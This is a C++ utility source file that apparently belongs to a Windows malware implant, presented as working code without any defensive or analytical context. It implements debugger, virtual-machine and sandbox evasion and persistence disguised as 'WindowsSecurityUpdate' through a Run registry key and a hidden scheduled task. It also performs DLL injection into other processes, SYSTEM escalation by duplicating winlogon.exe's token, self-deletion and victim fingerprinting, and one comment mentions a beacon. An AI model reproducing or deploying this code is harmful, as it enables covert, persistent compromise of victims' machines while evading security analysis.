#include "utils.h"
#include "config.h"
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <shlwapi.h>
#include <sstream>
#include <iomanip>
#include <ctime>
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shlwapi.lib")

namespace Utils {
    bool IsDebuggerAttached() {
        return IsDebuggerPresent() != 0;
    }
    
    bool IsVM() {
        std::vector<std::string> vmMacs = {
            "\x08\x00\x27", "\x00\x05\x69", "\x00\x0C\x29",
            "\x00\x1C\x42", "\x00\x50\x56", "\x00\x15\x5D"
        };
        
        ULONG bufLen = 0;
        GetAdaptersInfo(NULL, &bufLen);
        if (bufLen == 0) return false;
        
        PIP_ADAPTER_INFO pAdapter = (PIP_ADAPTER_INFO)GlobalAlloc(GPTR, bufLen);
        if (GetAdaptersInfo(pAdapter, &bufLen) != NO_ERROR) {
            GlobalFree(pAdapter);
            return false;
        }
        
        PIP_ADAPTER_INFO curr = pAdapter;
        while (curr) {
            for (const auto& mac : vmMacs) {
                if (memcmp(curr->Address, mac.c_str(), 3) == 0) {
                    GlobalFree(pAdapter);
                    return true;
                }
            }
            curr = curr->Next;
        }
        GlobalFree(pAdapter);
        return false;
    }
    
    bool IsSandbox() {
        // Time acceleration check
        DWORD start = GetTickCount();
        Sleep(3000);
        if (GetTickCount() - start < 2500) return true;
        
        // Username blacklist
        char user[256];
        DWORD size = 256;
        GetUserNameA(user, &size);
        std::string username(user);
        std::vector<std::string> badNames = {"sandbox", "malware", "test", "virus", "user", "vmware", "virtualbox"};
        for (const auto& n : badNames) {
            if (username.find(n) != std::string::npos) return true;
        }
        
        // Process count check (sandboxes often have few processes)
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32 pe = { sizeof(pe) };
        int count = 0;
        if (Process32First(snap, &pe)) {
            do { count++; } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
        if (count < 50) return true;
        
        return false;
    }
    
    bool ShouldExit() {
        return IsDebuggerAttached() || IsVM() || IsSandbox();
    }
    
    void InstallPersistence() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        
        // Registry Run key
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"WindowsSecurityUpdate", 0, REG_SZ, 
                          (BYTE*)exePath, (DWORD)((wcslen(exePath) + 1) * sizeof(wchar_t)));
            RegCloseKey(hKey);
        }
        
        // Scheduled task
        wchar_t cmd[512];
        swprintf_s(cmd, L"schtasks /create /tn \"WindowsSecurityUpdate\" /tr \"%s\" "
                   L"/sc onlogon /rl highest /f", exePath);
        
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    
    void RemovePersistence() {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegDeleteValueW(hKey, L"WindowsSecurityUpdate");
            RegCloseKey(hKey);
        }
        
        wchar_t cmd[] = L"schtasks /delete /tn \"WindowsSecurityUpdate\" /f";
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        if (pi.hProcess) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    
    DWORD FindProcess(const wchar_t* name) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe = { sizeof(pe) };
        DWORD pid = 0;
        if (Process32FirstW(snap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, name) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);
        return pid;
    }
    
    bool InjectDLL(DWORD pid, const wchar_t* dllPath) {
        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if (!hProc) return false;
        
        SIZE_T pathLen = (wcslen(dllPath) + 1) * sizeof(wchar_t);
        LPVOID remoteMem = VirtualAllocEx(hProc, NULL, pathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remoteMem) { CloseHandle(hProc); return false; }
        
        WriteProcessMemory(hProc, remoteMem, dllPath, pathLen, NULL);
        
        HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
        LPTHREAD_START_ROUTINE loadLib = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel, "LoadLibraryW");
        
        HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, loadLib, remoteMem, 0, NULL);
        if (!hThread) {
            VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
            CloseHandle(hProc);
            return false;
        }
        
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return true;
    }
    
    bool ElevateToSystem() {
        // Token theft from winlogon.exe
        DWORD pid = FindProcess(L"winlogon.exe");
        if (!pid) return false;
        
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProc) return false;
        
        HANDLE hToken = NULL;
        if (!OpenProcessToken(hProc, TOKEN_DUPLICATE, &hToken)) {
            CloseHandle(hProc);
            return false;
        }
        
        HANDLE hDupToken = NULL;
        SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, FALSE };
        if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDupToken)) {
            CloseHandle(hToken);
            CloseHandle(hProc);
            return false;
        }
        
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = {0};
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        
        BOOL result = CreateProcessWithTokenW(hDupToken, 0, exePath, NULL, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        
        if (result) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProc);
        return result;
    }
    
    bool WriteFileBinary(const std::string& path, const std::vector<BYTE>& data) {
        std::ofstream file(path, std::ios::binary);
        if (!file) return false;
        file.write((char*)data.data(), data.size());
        return file.good();
    }
    
    std::vector<BYTE> ReadFileBinary(const std::string& path) {
        std::ifstream file(path, std::ios::binary | std::ios::ate);
        if (!file) return std::vector<BYTE>();
        auto size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<BYTE> data((size_t)size);
        file.read((char*)data.data(), size);
        return data;
    }
    
    bool DeleteSelf() {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(NULL, exePath, MAX_PATH);
        return MoveFileExW(exePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT) != 0;
    }
    
    std::string WStringToString(const std::wstring& wstr) {
        if (wstr.empty()) return "";
        int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
        std::string result(len - 1, 0);
        WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], len, NULL, NULL);
        return result;
    }
    
    std::wstring StringToWString(const std::string& str) {
        if (str.empty()) return L"";
        int len = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
        std::wstring result(len - 1, 0);
        MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], len);
        return result;
    }
    
    std::string GetTimestamp() {
        time_t now = time(0);
        tm* ltm = localtime(&now);
        char buf[64];
        sprintf_s(buf, "%04d-%02d-%02d %02d:%02d:%02d",
                  1900 + ltm->tm_year, 1 + ltm->tm_mon, ltm->tm_mday,
                  ltm->tm_hour, ltm->tm_min, ltm->tm_sec);
        return std::string(buf);
    }
    
    std::string GetHostname() {
        char buf[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD len = sizeof(buf);
        GetComputerNameA(buf, &len);
        return std::string(buf);
    }
    
    std::string GetUsername() {
        char buf[256];
        DWORD len = 256;
        GetUserNameA(buf, &len);
        return std::string(buf);
    }
    
    std::string GetOSVersion() {
        OSVERSIONINFOEXA osvi = { sizeof(osvi) };
        #pragma warning(disable: 4996)
        GetVersionExA((OSVERSIONINFOA*)&osvi);
        std::stringstream ss;
        ss << "Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << " Build " << osvi.dwBuildNumber;
        return ss.str();
    }
    
    std::string GetPublicIP() {
        // Will be populated by beacon response
        return "0.0.0.0";
    }
    
    bool CreateSingleton(const char* name) {
        HANDLE hMutex = CreateMutexA(NULL, TRUE, name);
        return (GetLastError() != ERROR_ALREADY_EXISTS);
    }
}